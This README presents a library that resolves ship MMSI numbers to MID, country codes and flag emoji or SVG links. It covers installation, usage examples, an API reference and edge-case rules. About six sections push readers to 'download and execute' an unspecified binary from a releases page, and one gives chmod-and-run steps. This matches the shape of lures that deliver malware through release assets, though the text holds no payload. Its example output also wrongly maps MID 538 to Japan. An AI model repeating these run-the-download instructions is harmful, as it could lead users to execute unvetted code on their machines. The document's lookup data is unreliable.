MMSI Country Lookup — Resolve MMSI to Country, MID & Flag
==========================================================

[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/hariomdhakad16/mmsi-country-lookup/releases) [![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE) [![Topics](https://img.shields.io/badge/topics-ais%20%7C%20mmsi%20%7C%20mid-lightgrey)](#)

![AIS Ship Tracking](https://upload.wikimedia.org/wikipedia/commons/7/78/AIS_ship_tracking-01.jpg)

A compact library that extracts country and flag information from MMSI (Maritime Mobile Service Identity) numbers. Use it in back-end services, data pipelines, or command-line tools to map MMSI → MID → country alpha2/alpha3 → flag emoji or SVG.

Quick links
-----------

- Release assets: download and execute the file available at https://github.com/hariomdhakad16/mmsi-country-lookup/releases
- Releases page: https://github.com/hariomdhakad16/mmsi-country-lookup/releases

Install
-------

Install the package for your environment. Pick the package that matches your runtime.

Node (npm)
```
npm install mmsi-country-lookup
```

Python (pip)
```
pip install mmsi-country-lookup
```

Standalone binary / script
- Visit the releases page and download the release asset for your platform: https://github.com/hariomdhakad16/mmsi-country-lookup/releases
- Make the asset executable and run it
```
chmod +x mmsi-country-lookup-linux
./mmsi-country-lookup-linux --help
```

Core features
-------------

- Parse MMSI and return:
  - MID (Maritime Identification Digits)
  - Country name
  - ISO 3166-1 alpha2 and alpha3 codes
  - Country flag (emoji and SVG URL)
  - Region breakdown for shared MIDs
- Support for:
  - Ship stations and mobile units
  - Base stations and search & rescue units
  - Virtual and special-purpose MMSIs
- Small memory footprint. Optimized lookups with a compact MID table.

Why this library
----------------

- AIS data often includes only MMSI. This library resolves the MMSI to a country and useful metadata.
- It embeds a curated MID table. The table maps MMSI prefixes to official MIDs and country codes.
- Use the output to render flags, aggregate per-country statistics, or route alerts.

Usage examples
--------------

Node.js
```
const mmsiLookup = require('mmsi-country-lookup');

// single MMSI
const info = mmsiLookup.parse(538002123);
console.log(info);
/*
{
  mmsi: 538002123,
  mid: 538,
  country: 'Japan',
  alpha2: 'JP',
  alpha3: 'JPN',
  flagEmoji: '🇯🇵',
  flagSvg: 'https://flagcdn.com/jp.svg',
  type: 'ship'
}
*/

// batch
const list = [311000111, 257000222, 412345678];
const results = mmsiLookup.parseBatch(list);
console.log(results);
```

Python
```
from mmsi_country_lookup import parse, parse_batch

info = parse(236000999)
print(info)
# { 'mmsi':236000999, 'mid':236, 'country':'United Kingdom', ... }

batch = parse_batch([314000111, 244000222])
print(batch)
```

CLI
```
# After downloading the release asset and making it executable:
./mmsi-country-lookup 538002123 --format json
./mmsi-country-lookup --input file.csv --column mmsi --output annotated.csv
```

API reference
-------------

parse(mmsi)
- Input: integer or string MMSI
- Output: object with fields: mmsi, mid, country, alpha2, alpha3, flagEmoji, flagSvg, type

parseBatch(mmsiList)
- Input: array of MMSI values
- Output: array of parse results in the same order

getMID(mmsi)
- Returns only the MID numeric prefix

getFlagPath(alpha2)
- Returns a stable URL for an SVG flag for alpha2 code

Data model and mapping rules
----------------------------

- MMSI format: 9 digits. The MID is the first 3 digits for ship stations and most mobile units.
- MID mapping:
  - 201–775 cover most assigned states and territories.
  - Shared MIDs return a list of possible countries; library resolves to the primary country when possible.
- Special MMSI ranges:
  - 970–999 handle special services and non-country identifiers.
  - 00x, 111, 000 denote invalid or reserved values. The library flags them as "undefined".
- Flags:
  - Flag emoji comes from ISO alpha2.
  - Flag SVG links use a public CDN (flagcdn.com). The library returns a stable path to the SVG.

Edge cases and special handling
-------------------------------

- Virtual or tender vessels: these MMSIs sometimes use country of registry or owner. The library returns the MID-based country and tags the result as "probable".
- Shared MIDs: when multiple states share a MID, the library returns the list in the result and marks the primary state where available.
- Non-standard inputs: the library coerces numeric strings and strips whitespace. It validates length and digit-only input.
- Offshore platforms and coast guard: many states assign MMSI ranges to auxiliary services. The library returns type hints when the MMSI prefix maps to a non-ship service.

Data source and updates
-----------------------

- The MID table follows ITU assignments and curated supplemental entries.
- Update cadence: refer to releases for updated MID mappings and bug fixes.
- To get the latest binary or release asset, download and execute the file found on the releases page: https://github.com/hariomdhakad16/mmsi-country-lookup/releases

Performance
-----------

- Lookup uses a compact array and binary search over the MID ranges.
- Single parse average time: <1 ms on common server hardware.
- Batch mode processes large lists with streaming to keep memory usage low.

Testing and CI
--------------

- Unit tests cover:
  - MID extraction
  - ISO mappings
  - Edge cases and invalid MMSIs
- Run tests (Node)
```
npm test
```
- Run tests (Python)
```
pytest
```

Contributing
------------

- Fork the repo, create a feature branch, and submit a pull request.
- Update the MID table in data/mid-table.json when adding or changing entries.
- Add unit tests for new behavior.
- Follow the coding style in CONTRIBUTING.md.

Release notes
-------------

- Binary and packaged releases appear on the releases page. Download the right asset for your OS and architecture and execute it. See: https://github.com/hariomdhakad16/mmsi-country-lookup/releases

License
-------

- MIT. See LICENSE file.

Acknowledgements and resources
------------------------------

- ITU MID assignments
- Flag assets from flagcdn.com
- AIS protocol docs and MMSI format references

Examples and workflows
----------------------

Stream enrichment
```
# Node.js stream processing example (pseudo)
const fs = require('fs');
const csv = require('fast-csv');
const mmsi = require('mmsi-country-lookup');

fs.createReadStream('ais.csv')
  .pipe(csv.parse({ headers: true }))
  .transform(row => {
    const info = mmsi.parse(row.mmsi);
    row.country = info.country;
    row.flag = info.flagEmoji;
    return row;
  })
  .pipe(csv.format({ headers: true }))
  .pipe(fs.createWriteStream('ais-enriched.csv'));
```

Realtime dashboard
- Use alpha2 to fetch flag SVG and render per-vessel country icon.
- Aggregate by MID for heatmaps.

Maintenance tips
----------------

- Keep the MID table current. Reconcile with ITU circulars and official allocations.
- When adding custom mappings, document the source and date.
- Use release tags to track database changes and library behavior.

Contact and support
-------------------

- For binary releases and downloadable assets visit the releases page and execute the asset for your platform: https://github.com/hariomdhakad16/mmsi-country-lookup/releases
- For code issues open an issue in GitHub.

Changelog
---------

- The releases page lists tagged versions and change logs. Check releases for the latest update: https://github.com/hariomdhakad16/mmsi-country-lookup/releases

Badges and metadata
-------------------

[![MMSI](https://img.shields.io/badge/mmsi-lookup-orange.svg)](#) [![MID](https://img.shields.io/badge/MID-table-blue.svg)](#) [![AIS](https://img.shields.io/badge/AIS-supported-lightgrey.svg)](#)

Files of interest
-----------------

- src/: core parser and API
- data/mid-table.json: MID ↔ country mapping
- cli/: platform binaries or CLI wrapper
- tests/: unit and integration tests

Images and icons
----------------

- Flag SVGs: https://flagcdn.com
- AIS imagery: Wikimedia Commons and public domain maritime photos

License file and contribution guidelines sit in the repository root.